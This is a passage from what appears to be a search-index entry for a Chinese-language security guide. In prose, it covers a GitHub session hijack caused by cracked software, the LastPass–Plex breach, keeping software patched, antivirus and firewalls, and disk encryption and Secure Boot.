\u200b\u611f\u89c9\u200b\u5f88\u200b\u8be7\u5f02\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u81ea\u5df1\u200b\u7684\u200b GitHub \u200b\u8d26\u53f7\u200b\u65e9\u5df2\u200b\u5f00\u542f\u200b\u4e86\u200b\u4e24\u6b65\u200b\u9a8c\u8bc1\u200b\uff082FA\uff09\uff01</p> <p>\u200b\u68c0\u67e5\u200b Security Log \u200b\u540e\u200b\u53d1\u73b0\u200b\uff0c\u200b\u5728\u200b\u4e00\u5929\u200b\u524d\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6765\u81ea\u200b\u82f1\u56fd\u200b\u7684\u200b IP \u200b\u4f7f\u7528\u200b Windows Chrome\u300c\u200b\u5207\u6362\u200b\u300d\u200b\u4e86\u200b\u81ea\u5df1\u200b\u5728\u200b Windows \u200b\u6d4f\u89c8\u5668\u200b\u4e2d\u200b\u7684\u200b session \u200b\u7684\u200b\u56fd\u5bb6\u200b\uff0c\u200b\u4f46\u662f\u200b TA \u200b\u6ca1\u6709\u200b\u5728\u200b Windows \u200b\u4e0b\u200b\u4f7f\u7528\u200b\u8fc7\u200b Chrome\u3002\u200b\u5728\u200b\u51fa\u200b\u95ee\u9898\u200b\u7684\u200b\u5f53\u5929\u200b\u4e0b\u5348\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6765\u81ea\u200b\u4e4c\u514b\u5170\u200b\u7684\u200b IP \u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b Python \u200b\u811a\u672c\u200b\u6267\u884c\u200b\u4e86\u200b\u4e00\u7cfb\u5217\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5305\u62ec\u200b\u521b\u5efa\u200b\u4e86\u200b\u90a3\u4e2a\u200b\u5947\u602a\u200b\u7684\u200b\u4ed3\u5e93\u200b\u3002\u200b\u7531\u4e8e\u200b\u653b\u51fb\u8005\u200b\u76f4\u63a5\u200b\u5077\u53d6\u200b\u4e86\u200b\u6d4f\u89c8\u5668\u200b\u7684\u200b session\uff0c\u200b\u56e0\u6b64\u200b\u975e\u200b\u654f\u611f\u200b\u64cd\u4f5c\u200b\uff08\u200b\u4f8b\u5982\u200b\u521b\u5efa\u200b\u4ed3\u5e93\u200b\uff09\u200b\u4e0d\u4f1a\u200b\u89e6\u53d1\u200b\u4e24\u6b65\u200b\u9a8c\u8bc1\u200b\u3002</p> <p>\u200b\u5728\u200b\u8bbe\u7f6e\u200b\u4e2d\u200b\u7684\u200b Sessions \u200b\u9875\u9762\u200b\u79fb\u200b\u9664\u4e86\u200b\u5176\u4ed6\u200b\u7684\u200b session \u200b\u4e4b\u540e\u200b\uff0cTA \u200b\u68c0\u67e5\u200b\u4e86\u200b\u81ea\u5df1\u200b\u7684\u200b\u7535\u8111\u200b\uff0c\u200b\u5f00\u59cb\u200b\u6000\u7591\u200b\u8fd9\u4e2a\u200b\u300c\u200b\u7834\u89e3\u200b\u8f6f\u4ef6\u200b\u300d\u3002\u200b\u5c06\u200b\u5b89\u88c5\u5305\u200b\u7684\u200b zip \u200b\u4e0a\u4f20\u200b\u81f3\u200b VirusTotal (1) \u200b\u540e\u200b\uff0c\u200b\u53d1\u73b0\u200b\u8fd9\u4e2a\u200b\u5b89\u88c5\u5305\u200b\u4f1a\u200b\u6267\u884c\u200b\u5404\u79cd\u200b\u53ef\u7591\u200b\u884c\u4e3a\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4ece\u200b\u7f51\u7edc\u200b\u4e0b\u8f7d\u200b\u5176\u4ed6\u200b\u53ef\u6267\u884c\u7a0b\u5e8f\u200b\u5e76\u200b\u8fd0\u884c\u200b\u3001\u200b\u5c06\u200b\u81ea\u5df1\u200b\u52a0\u5165\u200b Windows Defender \u200b\u7684\u200b\u767d\u540d\u5355\u200b\u7b49\u200b\u3002</p> <ol> <li>VirusTotal \u200b\u662f\u200b\u4e00\u4e2a\u200b\u53ef\u4ee5\u200b\u4e0a\u4f20\u200b\u6587\u4ef6\u200b\u8fdb\u884c\u200b\u591a\u200b\u5f15\u64ce\u200b\u626b\u63cf\u200b\u7684\u200b\u7f51\u7ad9\u200b\uff08\u200b\u5305\u62ec\u200b\u56fd\u9645\u200b\u4e0e\u200b\u56fd\u5185\u200b\u7684\u200b\u77e5\u540d\u200b\u6740\u6bd2\u8f6f\u4ef6\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u8fd8\u4f1a\u200b\u901a\u8fc7\u200b\u6c99\u76d2\u200b\u8fd0\u884c\u200b\u6587\u4ef6\u200b\uff0c\u200b\u67e5\u770b\u200b\u5176\u200b\u884c\u4e3a\u200b\u3002VirusTotal \u200b\u662f\u200b\u5b89\u5168\u200b\u7814\u7a76\u200b\u4eba\u5458\u200b\u7684\u200b\u5e38\u7528\u5de5\u5177\u200b\u4e4b\u4e00\u200b\u3002</li> </ol> <p>\u200b\u8fdb\u4e00\u6b65\u200b\u5206\u6790\u200b\u53d1\u73b0\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u538b\u7f29\u5305\u200b\u4ec5\u4ec5\u53ea\u662f\u200b\u4e2a\u200b\u6076\u610f\u8f6f\u4ef6\u200b\u4e0b\u8f7d\u200b\u5668\u200b\uff1a\u200b\u5b83\u4f1a\u200b\u4ece\u200b Pastebin \u200b\u670d\u52a1\u200b (1) \u200b\u83b7\u53d6\u200b\u6076\u610f\u8f6f\u4ef6\u200b\u7684\u200b\u4e0b\u8f7d\u200b\u94fe\u63a5\u200b\uff0c\u200b\u4e0b\u8f7d\u200b\u540e\u200b\u8fd0\u884c\u200b\u3002\u200b\u800c\u200b\u8fd0\u884c\u200b\u7684\u200b\u6076\u610f\u8f6f\u4ef6\u200b\u53c8\u200b\u4f1a\u200b\u4ece\u200b\u653b\u51fb\u8005\u200b\u521b\u5efa\u200b\u7684\u200b Steam \u200b\u7684\u200b\u4e2a\u4eba\u200b\u9875\u9762\u200b\u4e0e\u200b Telegram \u200b\u9891\u9053\u200b\u83b7\u53d6\u200b\u653b\u51fb\u200b\u6307\u4ee4\u200b\uff1a</p> <ol> <li>Pastebin \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6587\u672c\u200b\u5206\u4eab\u200b\u670d\u52a1\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0a\u9762\u200b\u5206\u4eab\u200b\u6587\u672c\u200b\u3001\u200b\u4ee3\u7801\u200b\u7b49\u200b\u3002\u200b\u7531\u4e8e\u200b\u5176\u200b\u533f\u540d\u6027\u200b\uff0c\u200b\u4e5f\u200b\u7ecf\u5e38\u200b\u88ab\u200b\u7528\u4e8e\u200b\u5206\u4eab\u200b\u6076\u610f\u8f6f\u4ef6\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u3001\u200b\u4e0b\u8f7d\u200b\u94fe\u63a5\u200b\u7b49\u200b\u3002</li> </ol> <p></p> <p>\u200b\u4e8e\u662f\u200b TA \u200b\u7684\u200b\u673a\u5668\u200b\u5c31\u200b\u8fd9\u6837\u200b\u6ca6\u9677\u200b\u4e86\u200b\u3002</p> <p>\u200b\u603b\u7ed3\u200b\uff1a\u200b\u4e0d\u8981\u200b\u968f\u4fbf\u200b\u5173\u200b\u6740\u6bd2\u8f6f\u4ef6\u200b\u3001\u200b\u8dd1\u200b\u7834\u89e3\u200b\u7a0b\u5e8f\u200b\uff1b\u200b\u5c31\u7b97\u200b\u771f\u7684\u200b\u4e0d\u5f97\u4e0d\u200b\u8981\u200b\u4e5f\u200b\u8bf7\u200b\u52a1\u5fc5\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u91cc\u9762\u200b\u8fd0\u884c\u200b\u3002</p>"},{"location":"ops/security/#keep-updating","title":"\u53ca\u65f6\u200b\u66f4\u65b0\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e0e\u200b\u8f6f\u4ef6","text":"<p>\u200b\u5373\u4f7f\u200b\u5728\u200b\u7f16\u5199\u200b\u8f6f\u4ef6\u200b\u65f6\u200b\u975e\u5e38\u200b\u4ed4\u7ec6\u200b\u8c28\u614e\u200b\uff0c\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u4ecd\u7136\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5b58\u5728\u200b\u5b89\u5168\u6f0f\u6d1e\u200b\u3002\u200b\u4fdd\u6301\u200b\u8f6f\u4ef6\u200b\u66f4\u65b0\u200b\u53ef\u4ee5\u200b\u9632\u6b62\u200b\u653b\u51fb\u8005\u200b\u5229\u7528\u200b 1-day/n-day \u200b\u6f0f\u6d1e\u200b\u4e58\u865a\u800c\u5165\u200b\u3002\u200b\u540c\u65f6\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5bf9\u200b\u56fa\u5b9a\u200b\u7248\u672c\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u63d0\u4f9b\u200b\u65e0\u9650\u200b\u957f\u65f6\u95f4\u200b\u7684\u200b\u6280\u672f\u652f\u6301\u200b\u662f\u200b\u4e0d\u200b\u73b0\u5b9e\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8bb8\u591a\u200b\u8f6f\u4ef6\u200b\u4f1a\u200b\u8bbe\u7f6e\u200b\u300c\u200b\u751f\u547d\u5468\u671f\u200b\u300d\u200b\u7684\u200b\u7b56\u7565\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b\u7248\u672c\u200b\u5230\u8fbe\u200b\u4e86\u200b EOL\uff08End-of-life\uff09\u200b\u72b6\u6001\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5927\u200b\u7248\u672c\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u518d\u200b\u6536\u5230\u200b\u5f00\u53d1\u5546\u200b\u7684\u200b\u66f4\u65b0\u200b\uff0c\u200b\u56e0\u6b64\u200b\u66f4\u200b\u6709\u200b\u53ef\u80fd\u200b\u53d7\u5230\u200b\u5b89\u5168\u6f0f\u6d1e\u200b\u7684\u200b\u5a01\u80c1\u200b\u3002</p> <p>\u200b\u65b0\u95fb\u200b\u9009\u6458\u200b\uff1aLastPass \u200b\u4e0e\u200b Plex</p> <p>\u200b\u80cc\u666f\u200b\uff1aLastPass \u200b\u662f\u200b\u4e00\u6b3e\u200b\u514d\u8d39\u200b\u7684\u200b\u5728\u7ebf\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\uff0c\u200b\u66fe\u7ecf\u200b\u51fa\u73b0\u200b\u8fc7\u200b\u591a\u6b21\u200b\u5b89\u5168\u4e8b\u4ef6\u200b\uff1bPlex \u200b\u662f\u200b\u4e00\u6b3e\u200b\u5bb6\u5ead\u200b\u5a92\u4f53\u200b\u670d\u52a1\u5668\u8f6f\u4ef6\u200b\u3002</p> <p>Lastpass\u200b\u4e8b\u4ef6\u200b\u8ffd\u8e2a\u200b\uff1a\u200b\u9ed1\u5ba2\u200b\u5229\u7528\u200bPlex\u200b\u6f0f\u6d1e\u200b\u7a83\u53d6\u200b\u4e86\u200b\u6838\u5fc3\u200b\u5de5\u7a0b\u5e08\u200b\u7684\u200b\u4e3b\u200b\u5bc6\u7801\u200b</p> <p>Lastpass \u200b\u7ec8\u4e8e\u200b\u53c8\u200b\u516c\u5e03\u200b\u4e86\u200b\u88ab\u200b\u9ed1\u200b\u7684\u200b\u8c03\u67e5\u200b\u8fdb\u5c55\u200b\uff0c\u200b\u672c\u6b21\u200b\u66f4\u65b0\u200b\u7684\u200b\u8c03\u67e5\u62a5\u544a\u200b\u6307\u51fa\u200b\uff1aLastpass \u200b\u4e00\u540d\u200b\u6838\u5fc3\u200b\u5de5\u7a0b\u5e08\u200b\u7684\u200b\u5bb6\u5ead\u200b\u529e\u516c\u200b\u7535\u8111\u200b\u906d\u5230\u200b\u9ed1\u5ba2\u200b\u7684\u200b\u5165\u200b\u3002\u200b\u8fd9\u200b\u8fd8\u200b\u6d89\u53ca\u200b\u4e86\u200b\u53e6\u5916\u200b\u4e00\u6b3e\u200b\u77e5\u540d\u200b\u8f6f\u4ef6\u200b\uff1a\u200b\u6d41\u5a92\u4f53\u200b\u8f6f\u4ef6\u200b Plex\u3002</p> <p>\u2026\u2026\u2026\u2026</p> <p>\u200b\u6700\u521d\u200b\u9ed1\u5ba2\u200b\u5e94\u8be5\u200b\u662f\u200b\u5df2\u7ecf\u200b\u7784\u51c6\u200b Lastpass \u200b\u7684\u200b\u8fd9\u540d\u200b\u6838\u5fc3\u200b\u5de5\u7a0b\u5e08\u200b\uff0c\u200b\u8be5\u200b\u5de5\u7a0b\u5e08\u200b\u662f\u200b Lastpass \u200b\u56db\u540d\u200b\u638c\u63e1\u200b DevOps \u200b\u89e3\u5bc6\u200b\u5bc6\u94a5\u200b\u7684\u200b\u5de5\u7a0b\u5e08\u200b\u4e4b\u4e00\u200b\u3002</p> <p>\u200b\u9ed1\u5ba2\u200b\u901a\u8fc7\u200b Plex \u200b\u5b58\u5728\u200b\u7684\u200b\u8fdc\u7a0b\u200b\u4ee3\u7801\u6267\u884c\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u5728\u200b\u8fd9\u540d\u200b\u6838\u5fc3\u200b\u5de5\u7a0b\u5e08\u200b\u7684\u200b\u5bb6\u5ead\u200b\u529e\u516c\u200b\u7535\u8111\u200b\u4e0a\u200b\u5b89\u88c5\u200b\u4e86\u200b\u952e\u76d8\u8bb0\u5f55\u200b\u5668\u200b\uff0c\u200b\u5de5\u7a0b\u5e08\u200b\u767b\u5f55\u200b DevOps \u200b\u65f6\u200b\uff0c\u200b\u8f93\u5165\u200b\u89e3\u5bc6\u200b\u5bc6\u94a5\u200b (\u200b\u76f8\u5f53\u4e8e\u200b\u4e3b\u200b\u5bc6\u7801\u200b) \u200b\u7684\u200b\u65f6\u5019\u200b\u952e\u76d8\u8bb0\u5f55\u200b\u5668\u200b\u6210\u529f\u200b\u7a83\u53d6\u200b\u4e86\u200b\u4e3b\u200b\u5bc6\u7801\u200b\u3002</p> <p>Plex\u200b\u6025\u5fd9\u200b\u89e3\u91ca\u200b\uff1aLastpass\u200b\u88ab\u200b\u9ed1\u200b\u4e0e\u200b\u4ed6\u4eec\u200b\u65e0\u5173\u200b 2\u200b\u5e74\u524d\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u90fd\u200b\u4e0d\u200b\u4fee\u590d\u200b</p> <p>\u200b\u641e\u7b11\u200b\u7684\u200b\u662f\u200b Plex \u200b\u73b0\u5728\u200b\u7ad9\u200b\u51fa\u6765\u200b\u56de\u5e94\u200b\u8868\u793a\u200b\u81ea\u5df1\u200b\u4e0d\u200b\u80cc\u9505\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u88ab\u200b\u9ed1\u200b\u7684\u200b Lastpass \u200b\u5de5\u7a0b\u5e08\u200b\u4e24\u5e74\u200b\u591a\u200b\u90fd\u200b\u6ca1\u6709\u200b\u66f4\u65b0\u200b\u81ea\u5df1\u200b\u7684\u200b Plex \u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u957f\u671f\u200b\u4f7f\u7528\u200b\u5e26\u6709\u200b\u5b89\u5168\u6f0f\u6d1e\u200b\u7684\u200b\u7248\u672c\u200b\u3002</p> <p>Plex \u200b\u79f0\u200b 2020 \u200b\u5e74\u200b 5 \u200b\u6708\u200b 7 \u200b\u65e5\u8be5\u200b\u516c\u53f8\u200b\u62ab\u9732\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5b89\u5168\u6f0f\u6d1e\u200b\uff0c\u200b\u8be5\u200b\u6f0f\u6d1e\u200b\u5141\u8bb8\u200b\u90a3\u4e9b\u200b\u6709\u200b\u6743\u9650\u200b\u8bbf\u95ee\u200b\u670d\u52a1\u5668\u200b\u7ba1\u7406\u5458\u200b Plex \u200b\u8d26\u6237\u200b\u7684\u200b\u4eba\u200b\uff0c\u200b\u901a\u8fc7\u200b\u76f8\u673a\u200b\u4e0a\u4f20\u200b\u529f\u80fd\u200b\u4e0a\u4f20\u200b\u6076\u610f\u200b\u6587\u4ef6\u200b\u5230\u200b\u5a92\u4f53\u5e93\u200b\uff0c\u200b\u7136\u540e\u200b\u5229\u7528\u200b\u670d\u52a1\u5668\u200b\u6570\u636e\u200b\u76ee\u5f55\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4e0e\u200b\u4e0a\u4f20\u200b\u7684\u200b\u5e93\u200b\u91cd\u53e0\u200b\uff0c\u200b\u5e76\u200b\u8ba9\u200b\u5a92\u4f53\u200b\u670d\u52a1\u5668\u200b\u81ea\u52a8\u200b\u6267\u884c\u200b\u8fd9\u4e2a\u200b\u6076\u610f\u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u62ab\u9732\u200b\u6f0f\u6d1e\u200b\u7684\u200b\u5f53\u5929\u200b Plex \u200b\u5c31\u200b\u63a8\u51fa\u200b\u4e86\u200b Plex Media Server v1.19.3 \u200b\u7248\u200b\u4fee\u590d\u200b\u4e86\u200b\u8be5\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u7136\u540e\u200b\u81f3\u5c11\u200b\u5230\u200b 2022 \u200b\u5e74\u200b 8 \u200b\u6708\u200b Lastpass \u200b\u5de5\u7a0b\u5e08\u200b\u90fd\u200b\u6ca1\u6709\u200b\u5347\u7ea7\u200b\u81ea\u5df1\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u3002</p> <p>\u200b\u603b\u7ed3\u200b\uff1a\u200b\u4fdd\u8bc1\u200b\u81ea\u5df1\u200b\u5b89\u88c5\u200b\u7684\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e0e\u200b\u5e94\u7528\u200b\u5b89\u88c5\u200b\u4e86\u200b\u6700\u65b0\u200b\u7684\u200b\u5b89\u5168\u66f4\u65b0\u200b\uff0c\u200b\u5e76\u4e14\u200b\u907f\u514d\u200b\u7ee7\u7eed\u200b\u4f7f\u7528\u200b\u5df2\u7ecf\u200b\u7ed3\u675f\u200b\u652f\u6301\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u3002 endoflife.date \u200b\u6574\u7406\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u652f\u6301\u200b\u5468\u671f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f5c\u4e3a\u200b\u53c2\u8003\u200b\u3002</p>"},{"location":"ops/security/#security-software","title":"\u5b89\u5168\u8f6f\u4ef6","text":"<p>\u200b\u4e2a\u4eba\u200b\u8bbe\u5907\u200b\u4e0a\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u5b89\u5168\u8f6f\u4ef6\u200b\u6709\u200b\u6740\u6bd2\u8f6f\u4ef6\u200b\u4e0e\u200b\u9632\u706b\u5899\u200b\u4e24\u79cd\u200b\u3002Windows \u200b\u81ea\u5e26\u200b\u5e76\u200b\u9ed8\u8ba4\u200b\u542f\u7528\u200b\u4e86\u200b Microsoft Defender\uff0c\u200b\u5c3d\u7ba1\u200b\u8d44\u6e90\u200b\u5360\u7528\u200b\u8f83\u5927\u200b\uff0c\u200b\u4f46\u662f\u200b\u9632\u62a4\u200b\u6548\u679c\u200b\u53ef\u4ee5\u200b\u8bf4\u200b\u662f\u200b\u4e0d\u9519\u200b\u7684\u200b\uff1b\u200b\u800c\u200b\u5bf9\u200b Linux \u200b\u4e0e\u200b macOS \u200b\u7528\u6237\u200b\u6765\u8bb2\u200b\uff0c\u200b\u914d\u7f6e\u200b\u6740\u6bd2\u8f6f\u4ef6\u200b\u4e0d\u662f\u200b\u5e38\u89c1\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff1a</p> <ul> <li>Linux \u200b\u684c\u9762\u200b\u7528\u6237\u200b\u7684\u200b\u57fa\u6570\u200b\u5f88\u5c0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5927\u90e8\u5206\u200b\u4f7f\u7528\u200b Linux \u200b\u7684\u200b\u684c\u9762\u200b\u7528\u6237\u200b\u90fd\u200b\u6709\u7740\u200b\u826f\u597d\u200b\u7684\u200b\u5b89\u5168\u200b\u4e60\u60ef\u200b\u3002Linux \u200b\u4e0a\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u300c\u200b\u6740\u6bd2\u8f6f\u4ef6\u200b\u300dClamAV \u200b\u7684\u200b\u4e00\u822c\u200b\u7528\u9014\u200b\u662f\u200b\u5728\u200b\u90ae\u4ef6\u200b\u670d\u52a1\u5668\u200b\u4e2d\u200b\u68c0\u67e5\u200b\u90ae\u4ef6\u9644\u4ef6\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u75c5\u6bd2\u200b\u3002</li> <li>macOS \u200b\u9ed8\u8ba4\u200b\u542f\u7528\u200b\u4e86\u200b\u5305\u62ec\u200b GateKeeper\u3001XProtect \u200b\u7b49\u200b\u5b89\u5168\u200b\u673a\u5236\u200b\uff0c\u200b\u611f\u67d3\u200b\u76f8\u5bf9\u200b\u56f0\u96be\u200b\u3002</li> </ul> <p>\u200b\u800c\u200b\u9632\u706b\u5899\u200b\u7684\u200b\u4e3b\u8981\u200b\u4f5c\u7528\u200b\u5219\u200b\u662f\u200b\u963b\u6b62\u200b\u5165\u7ad9\u200b\u8fde\u63a5\u200b\uff1a\u200b\u4e00\u4e9b\u200b\u8f6f\u4ef6\u200b\u4f1a\u200b\u5728\u200b\u672c\u5730\u200b\u542f\u52a8\u200b\u670d\u52a1\u5668\u200b\uff08bind \u200b\u5230\u200b <code>0.0.0.0</code>\uff09\u200b\u5e76\u4e14\u200b\u76d1\u542c\u200b\u7aef\u53e3\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u505a\u200b\u9650\u5236\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6240\u6709\u200b\u80fd\u591f\u200b\u8fde\u63a5\u200b\u5230\u200b\u8bbe\u5907\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u4e0e\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u4ea4\u4e92\u200b\uff0c\u200b\u8fd9\u200b\u5728\u200b\u67d0\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u662f\u975e\u200b\u9884\u671f\u200b\u7684\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u6821\u56ed\u7f51\u200b\u7b49\u200b\u80fd\u591f\u200b\u83b7\u5f97\u200b\u516c\u7f51\u200b IP \u200b\u5730\u5740\u200b\u7684\u200b\u573a\u5408\u200b\u3002\u200b\u67d0\u4e9b\u200b\u8f6f\u4ef6\u200b\u53ef\u80fd\u200b\u4f1a\u200b\uff08\u200b\u9519\u8bef\u200b\u5730\u200b\u63cf\u8ff0\u200b\u81ea\u5df1\u200b\uff09\u200b\u7684\u200b\u529f\u80fd\u200b\u53ea\u4f1a\u200b\u63d0\u4f9b\u200b\u300c\u200b\u5c40\u57df\u7f51\u200b\u8fde\u63a5\u200b\u300d\uff0c\u200b\u800c\u200b\u5728\u200b\u542f\u7528\u200b\u529f\u80fd\u200b\u540e\u200b\u5c31\u200b\u5c06\u200b\u81ea\u5df1\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u5141\u8bb8\u200b\u4efb\u610f\u200b\u8fde\u63a5\u200b\u3002\u200b\u5982\u679c\u200b\u8fd9\u6837\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u5b58\u5728\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff08\u200b\u4f8b\u5982\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u5f31\u200b\u5bc6\u7801\u200b\u6216\u200b\u65e0\u200b\u5bc6\u7801\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u5916\u90e8\u200b\u7684\u200b\u653b\u51fb\u8005\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u501f\u6b64\u200b\u5165\u4fb5\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b Linux\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>netstat -tulnp</code> \u200b\u6216\u200b <code>ss -tulnp</code> \u200b\u547d\u4ee4\u200b\u68c0\u67e5\u200b\u76d1\u542c\u200b\u7684\u200b\u7aef\u53e3\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u9632\u706b\u5899\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u4f1a\u200b\u62d2\u7edd\u200b\u6240\u6709\u200b\u5165\u7ad9\u200b\uff0c\u200b\u9664\u975e\u200b\u7528\u6237\u200b\u540c\u610f\u200b\u3002Windows \u200b\u4e0b\u200b\u7684\u200b\u9632\u706b\u5899\u200b\u9ed8\u8ba4\u200b\u542f\u7528\u200b\uff0c\u200b\u800c\u200b macOS \u200b\u7684\u200b\u9632\u706b\u5899\u200b\u9ed8\u8ba4\u200b\u662f\u200b\u5173\u95ed\u200b\u7684\u200b\u3002Linux \u200b\u684c\u9762\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b ufw \u200b\u6216\u200b firewalld \u200b\u4f5c\u4e3a\u200b\u9632\u706b\u5899\u200b\u65b9\u6848\u200b\u3002</p>"},{"location":"ops/security/#physical-security","title":"\u7269\u7406\u200b\u5b89\u5168","text":"<p>\u200b\u4fdd\u8bc1\u200b\u7269\u7406\u200b\u5b89\u5168\u200b\u4e5f\u200b\u662f\u200b\u4e2a\u4eba\u200b\u8bbe\u5907\u200b\u5b89\u5168\u200b\u7684\u200b\u91cd\u8981\u4e00\u73af\u200b\u3002\u200b\u5efa\u8bae\u200b\u4e0d\u8981\u200b\u914d\u7f6e\u200b\u81ea\u52a8\u200b\u767b\u5f55\u200b\uff0c\u200b\u81f3\u5c11\u200b\u4fdd\u8bc1\u200b\u672c\u5730\u200b\u8d26\u6237\u200b\u6709\u200b\u8db3\u591f\u200b\u957f\u200b\u7684\u200b\u53e3\u4ee4\u200b\uff08\u200b\u6216\u8005\u200b\u5f3a\u5ea6\u200b\u8db3\u591f\u200b\u7684\u200b PIN\uff09\uff0c\u200b\u5e76\u4e14\u200b\u517b\u6210\u200b\u5728\u200b\u79bb\u5f00\u200b\u65f6\u9501\u200b\u5c4f\u200b\u7684\u200b\u597d\u200b\u4e60\u60ef\u200b\u3002\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0c\u200b\u5982\u679c\u200b\u53ef\u80fd\u200b\u6709\u200b\u653b\u51fb\u8005\u200b\u7269\u7406\u200b\u63a5\u89e6\u200b\u8bbe\u5907\u200b\u7684\u200b\u98ce\u9669\u200b\uff0c\u200b\u90a3\u4e48\u200b\u914d\u7f6e\u200b\u5168\u76d8\u200b\u52a0\u5bc6\u200b\uff08FDE\uff09\u200b\u4e5f\u200b\u662f\u200b\u91cd\u8981\u200b\u7684\u200b\u4e00\u6b65\u200b\u3002\u200b\u5bf9\u200b\u684c\u9762\u200b\u7cfb\u7edf\u200b\uff0cWindows \u200b\u5728\u200b\u65b0\u200b\u7684\u200b\u8bbe\u5907\u200b\u4e0a\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u542f\u7528\u200b BitLocker\uff0cmacOS \u200b\u4e5f\u200b\u4f1a\u200b\u5728\u200b\u6709\u200b T2 \u200b\u82af\u7247\u200b\u7684\u200b\u8bbe\u5907\u200b\u4e0a\u200b\u81ea\u52a8\u200b\u5f00\u542f\u200b FileVault\u3002\u200b\u800c\u200b Linux \u200b\u7528\u6237\u200b\u5219\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u914d\u7f6e\u200b LUKS\uff08Linux Unified Key Setup\uff09\u3002</p> <p>\u200b\u5982\u679c\u200b\u6709\u200b\u5bf9\u200b\u653b\u51fb\u8005\u200b\u7269\u7406\u200b\u63a5\u89e6\u200b\u8bbe\u5907\u200b\u540e\u200b\u7be1\u6539\u200b\u8bbe\u5907\u200b\u7684\u200b\u62c5\u5fe7\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd8\u200b\u9700\u8981\u200b\u5173\u5fc3\u200b\u5b89\u5168\u200b\u542f\u52a8\u200b\uff08Secure Boot\uff09\u3002\u200b\u5728\u200b\u6709\u200b\u5fc5\u8981\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b UEFI \u200b\u53e3\u4ee4\u200b\uff08\u200b\u5426\u5219\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5173\u6389\u200b\u5b89\u5168\u200b\u542f\u52a8\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\uff08\u200b\u5bf9\u200b Linux \u200b\u7528\u6237\u200b\u6765\u8bf4\u200b\uff09\u200b\u6b63\u786e\u200b\u914d\u7f6e\u200b\u5b89\u5168\u200b\u542f\u52a8\u200b\u3002</p> <p>\u200b\u4ece\u200b\u4e2a\u4eba\u200b\u8bbe\u5907\u200b\u5165\u4fb5\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u771f\u5b9e\u200b\u6848\u4f8b\u200b</p> <p>2015 \u200b\u5e74\u200b\u4e2d\u65ec\u200b\u7684\u200b\u771f\u5b9e\u200b\u6848\u4f8b\u200b\uff0c\u200b\u8be6\u89c1\u200b LUG 